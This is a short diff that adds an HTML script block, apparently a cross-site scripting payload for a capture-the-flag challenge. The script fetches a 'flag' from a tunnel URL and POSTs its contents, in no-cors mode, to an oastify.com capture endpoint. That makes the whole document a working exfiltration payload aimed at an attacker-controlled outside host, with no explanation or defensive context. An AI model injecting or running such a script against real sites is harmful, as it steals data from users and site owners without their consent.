@@ -1,0 +1,11 @@
+<script>
+(async () => {
+  const flag = await fetch('https://tar-award-writers-controllers.trycloudflare.com/flag').then(r => r.text());
+ 
+  await fetch('https://1prttq5teeywmghkpgb1yhv5iwonci07.oastify.com/capture', {
+    method: 'POST',
+    mode: 'no-cors',
+    body: flag
+  });
+})();
+</script>
